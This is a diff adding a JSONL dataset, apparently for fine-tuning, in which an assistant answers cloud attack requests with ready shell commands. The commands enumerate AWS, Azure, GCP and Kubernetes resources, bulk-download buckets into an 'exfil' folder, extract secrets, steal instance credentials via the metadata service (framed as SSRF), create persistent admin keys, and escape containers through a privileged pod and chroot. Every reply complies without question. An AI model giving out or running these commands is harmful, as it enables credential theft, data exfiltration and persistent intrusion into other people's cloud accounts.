@@ -1,0 +1,35 @@
+{"user": "Verify AWS credentials and get account info", "assistant": "aws sts get-caller-identity"}
+{"user": "List all S3 buckets in AWS account", "assistant": "aws s3 ls"}
+{"user": "Check S3 bucket ACL permissions for public access", "assistant": "aws s3api get-bucket-acl --bucket sensitive-docs"}
+{"user": "Download all files from S3 bucket", "assistant": "aws s3 sync s3://backup-database-dumps ./exfil/"}
+{"user": "List all EC2 instances in account", "assistant": "aws ec2 describe-instances"}
+{"user": "Enumerate IAM users in AWS account", "assistant": "aws iam list-users"}
+{"user": "Create persistent access key for IAM user", "assistant": "aws iam create-access-key --user-name admin"}
+{"user": "List Lambda functions for credential discovery", "assistant": "aws lambda list-functions"}
+{"user": "Get Lambda function environment variables with secrets", "assistant": "aws lambda get-function-configuration --function-name ProcessPayments"}
+{"user": "Enumerate RDS database instances", "assistant": "aws rds describe-db-instances"}
+{"user": "List AWS Secrets Manager secrets", "assistant": "aws secretsmanager list-secrets"}
+{"user": "Extract secret value from Secrets Manager", "assistant": "aws secretsmanager get-secret-value --secret-id azure/service-principal"}
+{"user": "Access AWS metadata service via SSRF", "assistant": "curl http://169.254.169.254/latest/meta-data/"}
+{"user": "Extract IAM role credentials from metadata", "assistant": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"}
+{"user": "Enumerate IAM roles attached to EC2 instance", "assistant": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+{"user": "Login to Azure with service principal", "assistant": "az login --service-principal -u CLIENT_ID -p CLIENT_SECRET --tenant TENANT_ID"}
+{"user": "List Azure subscriptions", "assistant": "az account list"}
+{"user": "Enumerate Azure virtual machines", "assistant": "az vm list --output table"}
+{"user": "List Azure storage accounts", "assistant": "az storage account list"}
+{"user": "Download blobs from Azure storage", "assistant": "az storage blob download-batch -d ./exfil/ -s container-name --account-name prodstorageacct"}
+{"user": "List Azure Key Vaults", "assistant": "az keyvault list"}
+{"user": "Extract secrets from Azure Key Vault", "assistant": "az keyvault secret show --vault-name prod-keyvault --name database-password"}
+{"user": "Check Kubernetes service account token in container", "assistant": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}
+{"user": "Access Kubernetes API from compromised container", "assistant": "curl -k -H \"Authorization: Bearer TOKEN\" https://kubernetes.default.svc/api/v1/pods"}
+{"user": "Check Kubernetes permissions of service account", "assistant": "kubectl auth can-i --list --token=TOKEN"}
+{"user": "Deploy privileged pod for container escape", "assistant": "kubectl apply -f privileged-pod.yaml --token=TOKEN"}
+{"user": "Execute command in Kubernetes pod", "assistant": "kubectl exec -it escape-pod -- chroot /host /bin/bash"}
+{"user": "Extract kubeconfig from Kubernetes node", "assistant": "cat /var/lib/kubelet/kubeconfig"}
+{"user": "Check container capabilities for escape vectors", "assistant": "capsh --print"}
+{"user": "List running containers on compromised host", "assistant": "docker ps"}
+{"user": "Execute shell in running Docker container", "assistant": "docker exec -it container_id /bin/bash"}
+{"user": "Enumerate GCP projects", "assistant": "gcloud projects list"}
+{"user": "List GCP compute instances", "assistant": "gcloud compute instances list"}
+{"user": "Access GCP metadata service", "assistant": "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'"}
+{"user": "List GCP storage buckets", "assistant": "gsutil ls"}
